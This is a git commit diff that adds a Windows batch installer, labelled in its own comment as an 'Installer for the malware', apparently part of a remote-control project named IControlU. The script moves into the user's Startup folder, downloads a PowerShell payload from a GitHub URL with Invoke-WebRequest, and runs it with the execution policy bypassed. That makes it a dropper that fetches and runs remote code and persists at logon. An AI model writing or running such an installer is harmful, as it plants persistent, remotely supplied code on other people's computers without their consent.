62177a91a8e0409616034503f3b0006cda02ee13
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-27 10:18:29 +0800

    Starting on installer

--- Installer/Installer.cmd
+++ Installer/Installer.cmd
@@ -1,1 +1,14 @@
-@rem 
+@rem Installer for the malware
+
+@echo off
+set "CurrentDirectory=%CD%"
+set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+@REM Change directory to startup
+cd /d "%StartupDirectory%"
+
+@REM Download required files
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1' -o Test.ps1"
+
+@REM Run the powershell discovery
+powershell -ExecutionPolicy Bypass -File .\Test.ps1
